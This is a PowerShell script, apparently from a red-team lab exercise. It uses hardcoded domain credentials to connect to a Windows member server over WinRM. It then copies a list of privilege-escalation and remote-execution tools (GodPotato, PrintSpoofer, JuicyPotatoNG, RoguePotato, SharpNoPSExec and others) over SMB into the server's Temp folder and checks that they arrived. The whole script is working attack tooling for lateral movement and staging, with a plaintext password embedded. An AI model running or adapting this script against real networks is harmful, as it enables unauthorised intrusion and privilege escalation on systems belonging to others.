[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Target = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$TargetHost = "mbr01.child.cadre.local",
    [Parameter(Mandatory=$false)]
    [string]$Username = "child.cadre.local\analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$SourceDir = "C:\Tools\ADTools",
    [Parameter(Mandatory=$false)]
    [string]$RemoteDir = "C$\Windows\Temp\cadre-tools"
)
$ErrorActionPreference = "Stop"

$tools = @(
    "GodPotato.exe",
    "GodPotato-NET4.exe",
    "PrintSpoofer.exe",
    "PrintSpoofer64.exe",
    "SweetPotato.exe",
    "JuicyPotatoNG.exe",
    "RoguePotato.exe",
    "SharpNoPSExec.exe"
)

$destUnc = "\\$TargetHost\$RemoteDir"
$destLocal = "C:\Windows\Temp\cadre-tools"

function Test-ToolLocal($name) {
    $p = Join-Path $SourceDir $name
    if (Test-Path $p) { return $p }
    return $null
}

function Copy-ToolToTarget($name) {
    $src = Test-ToolLocal $name
    if (-not $src) {
        Write-Output "MISSING_WS01: $name not found in $SourceDir"
        return $false
    }
    $dst = Join-Path $destUnc $name
    try {
        Copy-Item -Path $src -Destination $dst -Force -ErrorAction Stop
        $verify = Join-Path $destLocal $name
        $remoteCheck = Invoke-Command -ComputerName $TargetHost -Credential $cred -ScriptBlock {
            param($p)
            if (Test-Path $p) {
                $i = Get-Item $p
                return "OK|$($i.Length)"
            }
            return "MISSING"
        } -ArgumentList $verify -ErrorAction Stop
        Write-Output "STAGED|$name|$remoteCheck"
        return $remoteCheck -like "OK*"
    } catch {
        Write-Output "COPY_FAIL|$name|$($_.Exception.Message)"
        return $false
    }
}

$securePass = ConvertTo-SecureString $Password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($Username, $securePass)

try {
    # Ensure destination directory exists on target
    Invoke-Command -ComputerName $TargetHost -Credential $cred -ScriptBlock {
        param($d)
        New-Item -ItemType Directory -Path $d -Force -ErrorAction SilentlyContinue | Out-Null
        $i = Get-Item $d
        Write-Output ("DIR_OK|" + $i.FullName + "|" + $i.LastWriteTime)
    } -ArgumentList $destLocal -ErrorAction Stop

    $copied = 0
    foreach ($t in $tools) {
        if (Copy-ToolToTarget $t) { $copied++ }
    }

    Write-Output "STAGE_SUMMARY|$copied|$($tools.Count)"
    if ($copied -eq 0) {
        Write-Output "STAGE_FAIL: no tools could be copied from ws01 to mbr01"
        exit 1
    }

    # List remote directory for operator verification
    $listing = Invoke-Command -ComputerName $TargetHost -Credential $cred -ScriptBlock {
        param($d)
        Get-ChildItem $d | Select-Object Name, Length | ForEach-Object { "$($_.Name)|$($_.Length)" }
    } -ArgumentList $destLocal -ErrorAction Stop
    $listing | ForEach-Object { Write-Output "REMOTE|$_" }

    Write-Output "T043_STAGE_OK: tools staged on mbr01 from ws01 via SMB"
} catch {
    Write-Output "STAGE_FAIL: $($_.Exception.Message)"
    exit 1
}
